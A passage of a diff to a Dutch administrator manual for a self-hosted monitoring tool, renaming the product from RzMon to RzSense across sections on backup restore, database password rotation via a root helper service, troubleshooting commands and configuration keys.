-1. Installeer RzMon, bijvoorbeeld met `install-rocky.sh`, of zet alleen de bestanden en MariaDB klaar.
+1. Installeer RzSense, bijvoorbeeld met `install-rocky.sh`, of zet alleen de bestanden en MariaDB klaar.
 2. Zet de zip op de server en voer uit:
    ```bash
    sudo php /var/www/rzmon/install/install.php --restore /root/rzmon-backup-….zip --with-config
    ```
    Je wordt om het zip-wachtwoord gevraagd (of geef `--password=…` mee).
-3. RzMon zet `config.php` terug, maakt de database en de databasegebruiker aan met het wachtwoord uit de back-up, en zet de database terug. Zonder `config.php` op de server gebeurt dit automatisch, ook zonder `--with-config`.
+3. RzSense zet `config.php` terug, maakt de database en de databasegebruiker aan met het wachtwoord uit de back-up, en zet de database terug. Zonder `config.php` op de server gebeurt dit automatisch, ook zonder `--with-config`.
 
 Uit veiligheid wordt een `config.php` met programmacode erin niet teruggezet: alleen gewone instellingen.
 
@@ -4124,10 +4126,10 @@ Opnieuw `install-rocky.sh` draaien doet beide ook.
 Onder **Instellingen → Database** staat de knop **🔑 Databasewachtwoord vernieuwen** (alleen voor beheerders).
 
 1. Klik op de knop en bevestig met **je eigen wachtwoord**. Ben je op het LAN automatisch beheerder (zonder inloggen), dan typ je `VERNIEUWEN`.
-2. RzMon maakt een nieuw wachtwoord van 32 tekens en zet het in MariaDB **en** in `config.php`. Daarna test hij de verbinding. Mislukt er iets, dan wordt alles teruggezet en verandert er niets.
+2. RzSense maakt een nieuw wachtwoord van 32 tekens en zet het in MariaDB **en** in `config.php`. Daarna test hij de verbinding. Mislukt er iets, dan wordt alles teruggezet en verandert er niets.
 3. Het nieuwe wachtwoord wordt **één keer** getoond. Kopieer het als je het ergens wilt bewaren. Het staat ook in `/root/rzmon-install.txt`.
 
-Dashboard, cron, agents en de API blijven gewoon werken: zij praten via RzMon met de database en gebruiken dus vanzelf het nieuwe wachtwoord.
+Dashboard, cron, agents en de API blijven gewoon werken: zij praten via RzSense met de database en gebruiken dus vanzelf het nieuwe wachtwoord.
 
 **De hulpdienst.** De webserver mag `config.php` niet wijzigen (de map is na de setup vergrendeld, zie de checklist hierboven). Daarom doet een kleine systemd-dienst het wisselen als root:
 
@@ -4139,7 +4141,7 @@ Dashboard, cron, agents en de API blijven gewoon werken: zij praten via RzMon me
 - de webpagina zet alleen de gewijzigde **waarden** in `/var/lib/rzmon/config.request` (geen PHP-code);
 - `rzmon-config.path` start `install.php --apply-config --helper` als root. Die controleert alle waarden opnieuw (alleen deze vaste velden, elk met een vaste vorm), test bij een nieuwe database eerst de verbinding, maakt een **reservekopie** in `/var/lib/rzmon/backups/config-…php` (de laatste 10) en schrijft config.php met dezelfde eigenaar en rechten;
 - binnen een paar seconden zie je *Opgeslagen door de hulpdienst*. Lukt het niet, of draait de hulpdienst niet, dan krijg je zoals eerder de inhoud om zelf te plaatsen.
-Bij bijwerken met de knop in RzMon (Rocky/RHEL/AlmaLinux) komt de nieuwe dienst vanzelf mee; anders één keer `sudo bash /var/www/rzmon/install/install-helper.sh`.
+Bij bijwerken met de knop in RzSense (Rocky/RHEL/AlmaLinux) komt de nieuwe dienst vanzelf mee; anders één keer `sudo bash /var/www/rzmon/install/install-helper.sh`.
 
 `install-rocky.sh` installeert de hulpdienst automatisch. Heb je een oudere installatie, voer dan één keer uit:
 
@@ -4171,19 +4173,19 @@ sudo php /var/www/rzmon/install/install.php --rotate-db-password
 | **2FA-code steeds "onjuist"** | Staat de klok van je telefoon én van de server goed? Codes wisselen elke 30 seconden. Controleer de server met `timedatectl` |
 | **Testmail mislukt** | Lees de foutmelding: bij "gebruikersnaam/wachtwoord onjuist" heb je bij Gmail/Outlook een app-wachtwoord nodig. Bij een time-out: 465 = SSL/TLS, 587 = STARTTLS. Op Rocky Linux moet SELinux uitgaande verbindingen toestaan (`setsebool -P httpd_can_network_connect 1`, doet het installatiescript al) |
 | **MQTT: "geen toegang"** | Gebruikersnaam/wachtwoord van de broker klopt niet. Bij de Mosquitto-add-on: gebruik een HA-gebruiker of zet een login in de add-on-configuratie |
-| **MQTT: geen apparaten in HA** | Is de MQTT-integratie in HA toegevoegd? Klopt de discovery-prefix (`homeassistant`)? Klik op *Verbinding testen & publiceren*. Met `mosquitto_sub -h <broker> -u … -P … -t 'rzmon/#' -v` zie je wat RzMon stuurt |
+| **MQTT: geen apparaten in HA** | Is de MQTT-integratie in HA toegevoegd? Klopt de discovery-prefix (`homeassistant`)? Klik op *Verbinding testen & publiceren*. Met `mosquitto_sub -h <broker> -u … -P … -t 'rzmon/#' -v` zie je wat RzSense stuurt |
 | **SSL-check: "niet vertrouwd of naam klopt niet"** | Self-signed certificaat (bv. Proxmox of een NAS): zet *Certificaat controleren* uit bij de check. De vervaldatum wordt dan nog steeds bewaakt |
 | **Bijwerken mislukt: "PHP-extensie mbstring ontbreekt"** | Een fout in de controle van het installatiescript (tot 1.92.0); mbstring is er wel. De nieuwe code staat er al. Werk bij naar 1.92.1 of nieuwer, of draai `sudo bash /var/www/rzmon/install/install-rocky.sh --yes` |
 | **Dashboard stuurt door naar Setup** | De database is onbereikbaar. Controleer `sudo systemctl status mariadb` en de gegevens bij Setup → Database |
 | **"Cron draait" blijft oranje** | Controleer `/etc/cron.d/rzmon`: het bestand moet van root zijn en mag geen punt in de naam hebben. Test handmatig met `sudo -u www-data php cron/run.php` |
 | **Ping: "not found"** | `sudo apt install iputils-ping`, en zet het juiste pad bij Setup (`command -v ping`) |
 | **Ping: "Operation not permitted"** | `echo 'net.ipv4.ping_group_range = 0 2147483647' \| sudo tee /etc/sysctl.d/99-ping.conf && sudo sysctl --system` |
-| **Service-check: "System has not been booted with systemd"** | RzMon draait in een container zonder systemd. Gebruik dan TCP-checks, of een agent op de host |
+| **Service-check: "System has not been booted with systemd"** | RzSense draait in een container zonder systemd. Gebruik dan TCP-checks, of een agent op de host |
 | **HTTP-check: SSL-fout** | Het certificaat is verlopen of self-signed, of het systeem mist CA-certificaten (`sudo apt install ca-certificates`) |
 | **Pushover-test mislukt** | Controleer de user key en het token. De server moet uitgaand `https://api.pushover.net` kunnen bereiken: test met `curl -I https://api.pushover.net` |
-| **Agent rapporteert niet / "Nog geen rapport ontvangen"** | Op de server: `sudo rzmon-agent-setup --test` (§8.4). In RzMon staan bij *Agent Manager* de geweigerde pogingen met reden |
+| **Agent rapporteert niet / "Nog geen rapport ontvangen"** | Op de server: `sudo rzmon-agent-setup --test` (§8.4). In RzSense staan bij *Agent Manager* de geweigerde pogingen met reden |
 | **Agent: `403`** | Het token klopt niet, of de server staat niet op type *Remote met agent* |
-| **Agent-checks: "Agent stil sinds …"** | Draait de cron op de agent-server? Kan die server RzMon bereiken? Test het commando uit hoofdstuk 8 |
+| **Agent-checks: "Agent stil sinds …"** | Draait de cron op de agent-server? Kan die server RzSense bereiken? Test het commando uit hoofdstuk 8 |
 | **Agent: "meldt service X niet"** | Werk de agent bij (⬆, 8.2.1); vanaf 1.20.0 bewaakt hij vanzelf elke service waarvoor een check bestaat. Net toegevoegd? Wacht ~2 minuten |
 | **HA-add-on niet zichtbaar in de winkel** | Staat de map als `/addons/rzmon_agent/config.yaml`? Doe ⋮ → *Controleren op updates* en ververs de browser |
 | **REST API geeft 401 met een geldige sleutel (Apache + PHP-FPM)** | Zet `CGIPassAuth On` in de vhost (hoofdstuk 5.4), of gebruik de header `X-API-Key: rzm_…` |
@@ -4222,8 +4224,8 @@ rzmon/
 | `db.host` / `db.port` / `db.name` / `db.user` / `db.pass` | Databaseverbinding |
 | `timezone` | Bijvoorbeeld `Europe/Amsterdam` |
 | `ping_bin` | Pad naar ping |
-| `base_url` | Adres van RzMon, voor de agent-instructies |
-| `php.memory_limit` / `php.max_execution_time` / `php.display_errors` | PHP-waarden die RzMon zelf toepast. Leeg = waarde uit php.ini |
+| `base_url` | Adres van RzSense, voor de agent-instructies |
+| `php.memory_limit` / `php.max_execution_time` / `php.display_errors` | PHP-waarden die RzSense zelf toepast. Leeg = waarde uit php.ini |
 
 ### Commando's
 | Commando | Doel |
